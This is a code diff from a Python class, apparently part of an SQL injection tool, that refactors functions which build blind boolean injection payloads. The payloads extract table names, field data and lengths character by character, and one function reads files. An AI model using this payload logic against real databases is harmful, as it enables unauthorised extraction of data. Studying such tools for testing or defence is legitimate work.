@@ -119,7 +119,7 @@ class DbmsMole():
             where = ' where ' + where
         else:
             where = ' '
-        return ' and {op_par}' + str(value) + ' < (select ascii(substring('+fields+', '+str(index)+', 1)) ' + table+' ' + self.parse_condition(where) + ' limit 1 offset '+str(offset) + ')'
+        return ' and {op_par}' + str(value) + ' < (select ascii(substring('+self._concat_fields(fields)+', '+str(index)+', 1)) ' + table+' ' + self.parse_condition(where) + ' limit 1 offset '+str(offset) + ')'
         
     def forge_blind_count_query(self, operator, value, table, where="1=1"):
         if len(table) > 0:
@@ -129,13 +129,13 @@ class DbmsMole():
             where = ' '
         return ' and {op_par}' + str(value) + ' ' + operator + ' (select count(*)  '+table+' '+self.parse_condition(where)+')'
 
-    def forge_blind_len_query(self, operator, value, field, table, where="1=1", offset=0):
+    def forge_blind_len_query(self, operator, value, fields, table, where="1=1", offset=0):
         if len(table) > 0:
             table = ' from ' + table
             where = ' where ' + where
         else:
             where = ' '
-        return ' and {op_par}' + str(value) + ' ' + operator + ' (select length('+field+') '+table+' ' + self.parse_condition(where) + ' limit 1 offset '+str(offset)+')'
+        return ' and {op_par}' + str(value) + ' ' + operator + ' (select length('+self._concat_fields(fields)+') '+table+' ' + self.parse_condition(where) + ' limit 1 offset '+str(offset)+')'
 
     def schema_count_query(self, columns, injectable_field):
         info = self._schemas_query_info()
@@ -151,14 +151,14 @@ class DbmsMole():
         info = self._tables_query_info(db)
         return self.forge_count_query(columns, info["field"], 
                     info['table'], injectable_field,
-                    info['filter'] + ' and ' + info["field"] + ' like ' + table_filter,
+                    info['filter'] + ' and ' + info["field"][0] + ' like ' + table_filter,
                )
 
     def tables_like_query(self, db, columns, injectable_field, table_filter, offset):
         info = self._tables_query_info(db)
         return self.forge_query(columns, info['field'], 
                     info['table'], injectable_field,
-                    info['filter'] + ' and ' + info["field"] + ' like ' + table_filter, offset=offset
+                    info['filter'] + ' and ' + info["field"][0] + ' like ' + table_filter, offset=offset
                )
 
     def table_count_query(self, db, columns, injectable_field):
@@ -298,21 +298,21 @@ class DbmsMole():
         info = self._tables_query_info(db)
         return self.forge_integer_count_query(columns, info["field"], 
                     info['table'], injectable_field,
-                    info['filter'] + ' and ' + info["field"] + ' like ' + table_filter,
+                    info['filter'] + ' and ' + info["field"][0] + ' like ' + table_filter,
                )
 
     def tables_like_integer_len_query(self, db, columns, injectable_field, table_filter, offset):
         info = self._tables_query_info(db)
         return self.forge_integer_len_query(columns, info['field'], 
                     info['table'], injectable_field,
-                    info['filter'] + ' and ' + info["field"] + ' like ' + table_filter, offset=offset
+                    info['filter'] + ' and ' + info["field"][0] + ' like ' + table_filter, offset=offset
                )
 
     def tables_like_integer_query(self, index, db, columns, injectable_field, table_filter, offset):
         info = self._tables_query_info(db)
         return self.forge_integer_query(columns, index, info['field'], 
                     info['table'], injectable_field,
-                    info['filter'] + ' and ' + info["field"] + ' like ' + table_filter, offset=offset
+                    info['filter'] + ' and ' + info["field"][0] + ' like ' + table_filter, offset=offset
                )
 
     def dbinfo_integer_query(self, index, columns, injectable_field):
@@ -371,21 +371,21 @@ class DbmsMole():
         info = self._tables_query_info(db)
         return self.forge_blind_count_query(
             operator, value, info['table'], 
-            where=info['filter'] + ' and ' + info["field"] + ' like ' + table_filter
+            where=info['filter'] + ' and ' + info["field"][0] + ' like ' + table_filter
         )
 
     def tables_like_blind_len_query(self, operator, value, db, table_filter, offset):
         info = self._tables_query_info(db)
         return self.forge_blind_len_query(
             operator, value, info['field'], 
-            info['table'], offset=offset, where=info['filter'] + ' and ' + info["field"] + ' like ' + table_filter
+            info['table'], offset=offset, where=info['filter'] + ' and ' + info["field"][0] + ' like ' + table_filter
         )
 
     def tables_like_blind_data_query(self, index, value, db, table_filter, offset):
         info = self._tables_query_info(db)
         return self.forge_blind_query(
             index, value, info['field'], info['table'], 
-            offset=offset, where=info['filter'] + ' and ' + info["field"] + ' like ' + table_filter
+            offset=offset, where=info['filter'] + ' and ' + info["field"][0] + ' like ' + table_filter
         )
 
     def columns_blind_count_query(self, operator, value, db, table):
@@ -420,34 +420,33 @@ class DbmsMole():
     def fields_blind_len_query(self, operator, value, fields, db, table, offset, where="1=1"):
         info = self._fields_query_info(fields, db, table, where)
         return self.forge_blind_len_query(
-            operator, value, self._concat_fields(fields), 
+            operator, value, fields, 
             info['table'], offset=offset, where=info['filter']
         )
 
     def fields_blind_data_query(self, index, value, fields, db, table, offset, where="1=1"):
         info = self._fields_query_info(fields, db, table, where)
         return self.forge_blind_query(
-            index, value, self._concat_fields(fields), 
+            index, value, fields, 
             info['table'], offset=offset, where=info['filter']
         )
 
     def dbinfo_blind_len_query(self, operator, value):
         info = self._dbinfo_query_info()
         return self.forge_blind_len_query(
-            operator, value, self._concat_fields(info['field'].split(',')), info['table']
+            operator, value, info['field'], info['table']
         )
 
     def dbinfo_blind_data_query(self, index, value):
         info = self._dbinfo_query_info()
         return self.forge_blind_query(
-            index, value, self._concat_fields(info['field'].split(',')), info['table']
+            index, value, info['field'], info['table']
         )
         
     def read_file_query(self, filename, columns, injectable_field):
         info = self._read_file_query_info(filename)
         return self.forge_query(columns, info['field'], 
                info['table'], injectable_field)
-
 
 class FingerBase:
     def __init__(self, query, to_search, is_string_query = True):
